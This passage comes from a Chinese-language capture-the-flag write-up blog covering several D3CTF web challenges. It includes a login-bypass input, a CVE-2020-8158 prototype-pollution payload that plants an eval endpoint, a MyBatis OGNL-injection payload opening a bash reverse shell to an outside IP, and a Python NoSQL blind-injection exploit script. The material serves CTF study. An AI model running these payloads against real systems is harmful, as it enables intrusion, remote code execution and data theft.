+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (req.cookies.login) &#123;</span><br><span class="line">let obj;</span><br><span class="line">try &#123;</span><br><span class="line">obj &#x3D; JSON.parse(req.cookies.login);</span><br><span class="line">User.findOne(&#123; where: &#123; username: obj[0], password: obj[1] &#125; &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送下面的数据可以登录任意用户</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password: &#123; password: 1 &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2020-8158"><a href="#CVE-2020-8158" class="headerlink" title="CVE-2020-8158"></a>CVE-2020-8158</h2><p>发送下面的数据到 {host}/article/0/edit 可以rce</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data &#x3D; &#123;&quot;title&quot;:&quot;rce&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;ee;app.use(&#39;&#x2F;rce&#39;,</span><br><span class="line">(q,r)&#x3D;&gt;r.send(eval(q.body.c)));return &#39;rce!&#39;;&#x2F;&#x2F;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><ul>
+<li>mybatis</li>
+<li>OGNL表达式</li>
+</ul>
+<p>dockerfile.bak</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FROM maven:latest as builder1</span><br><span class="line"></span><br><span class="line">WORKDIR &#x2F;build</span><br><span class="line">ADD . .</span><br><span class="line">ADD .&#x2F;settings-docker.xml &#x2F;root&#x2F;.m2&#x2F;settings.xml</span><br><span class="line">RUN mvn clean package</span><br><span class="line"></span><br><span class="line">FROM debian:buster-slim as builder2</span><br><span class="line"></span><br><span class="line">ADD readflag.c &#x2F;readflag.c</span><br><span class="line">RUN apt update &amp;&amp; apt install -y gcc</span><br><span class="line">RUN gcc &#x2F;readflag.c -o &#x2F;readflag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FROM openjdk:11-jdk</span><br><span class="line"></span><br><span class="line">WORKDIR &#x2F;app</span><br><span class="line">COPY --from&#x3D;builder1 &#x2F;build&#x2F;target&#x2F;ezsql-0.0.1-SNAPSHOT.jar .</span><br><span class="line">COPY --from&#x3D;builder2 &#x2F;readflag &#x2F;readflag</span><br><span class="line">RUN echo d3ctf&#123;FLAG&#125; &gt; &#x2F;flag</span><br><span class="line">RUN chmod 0400 &#x2F;flag</span><br><span class="line">RUN chmod 0444 Dockerfile ezsql-0.0.1-SNAPSHOT.jar</span><br><span class="line">RUN chown root:root &#x2F;flag ezsql-0.0.1-SNAPSHOT.jar Dockerfile</span><br><span class="line">RUN chmod 4555 &#x2F;readflag</span><br><span class="line">RUN useradd d3ctf</span><br><span class="line">USER d3ctf</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [ &quot;java&quot;, &quot;-jar&quot;, &quot;ezsql-0.0.1-SNAPSHOT.jar&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>还给了一个jar包，反编译看一下,jd-gui反编译出来缺少代码，使用idea反编译</p>
+<p>能看出一处sql注入</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/1c84117cbe29babbcfb6d0fdcf3ae6bd.png" alt="image-20220311133622626"></p>
+<p>发现后端是用mybatis</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/38ece7e2ea25e2a57485d118361f74aa.png" alt="image-20220311134050464"></p>
+<p>wp：<strong>mybatis 的 SQL 映射支持使用 OGNL 表达式， VoteProvider 直接使用字符串拼接来生成 SQL 语句，如果错误地把 用户输入拼接进去，不仅会发生 SQL 注入，还会引发 OGNL 注入</strong></p>
+<p>表达式注入rce</p>
+<blockquote>
+<p>${xxx} 告诉 mybatis 在此处创建一个预处理语句参数，借助 OGNL 来实现参数 SQL 语句的参数绑定。 如果用户能够控制 ${} 中的内容，就能通过 OGNL 表达式来注入到达 RCE 的目的</p>
+</blockquote>
+<p><strong>题目里使用的 org.mybatis.spring.boot 是最新的 2.2.2 版本，对应的 OGNL 依赖的版本为 3.3.0, 高版本的 OGNL 启用了 stricter invocation mode ，使用硬编码的方式 ban 掉了一些 class, 其中就包括 java.lang.Runtime ，要 bypass 得借助反射</strong></p>
+<p>payload，整体urlencode一次</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;vote&#x2F;getDetailedVoteById?vid&#x3D;3) union select null,&quot;$&#123;#this.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[14].invoke(#this.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(),&#39;bash,-c,bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.5.169.223&#x2F;39876 0&gt;&amp;1&#39;.split(&#39;,&#39;))&#125;&quot;,null,null,null--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="d3fGo"><a href="#d3fGo" class="headerlink" title="d3fGo"></a>d3fGo</h1><p>给了一个ELF文件，go编译的web服务端,不会弄，也尝试使用ida提取信息，太菜了，不会弄，最后是个Nosql注入</p>
+<p>WP：</p>
+<p>fgo 里搜/api搜到/api/Admini/Login。</p>
+<p>fgo 里搜*struct 搜到seeecret字段。</p>
+<p>粗略查看/api/Admini/Login的逻辑，如果提交的数据有seeecret字段 则mongodb查询参数是username password seeecret三个字段，否则是username password 两个字段。</p>
+<p>seeecret字段 mongodb布尔盲注出flag。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;api&#x2F;Admini&#x2F;Login</span><br><span class="line">*struct &#123; Username interface &#123;&#125; \&quot;json:\\\&quot;username\\\&quot;\&quot;; Password interface &#123;&#125; \&quot;json:\\\&quot;password\\\&quot;\&quot;; Seeecret interface &#123;&#125; \&quot;json:\\\&quot;seeecret\\\&quot;\&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string,re</span><br><span class="line">ip = <span class="string">&quot;http://7b470ec8f6.fgo-d3ctf-challenge.n3ko.co&quot;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">            t = flag + re.escape(i)</span><br><span class="line">            resp = requests.post(ip + <span class="string">&quot;/api/Admini/Login&quot;</span>,json=&#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:&#123;<span class="string">&quot;$ne&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;,<span class="string">&quot;password&quot;</span>:&#123;<span class="string">&quot;$ne&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;,</span><br><span class="line">                <span class="string">&quot;seeecret&quot;</span>:&#123;<span class="string">&quot;$regex&quot;</span>:<span class="string">&quot;^&quot;</span>+t&#125;</span><br><span class="line">            &#125;,proxies=proxies)</span><br><span class="line">            <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">                flag = t</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/CommonsCollections-1(%E4%B8%8B)/" rel="prev" title="CommonsCollections-1(下)">
+                  <i class="fa fa-angle-left"></i> CommonsCollections-1(下)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/Dest0g3%20520/" rel="next" title="Dest0g3 520迎新赛">
+                  Dest0g3 520迎新赛 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
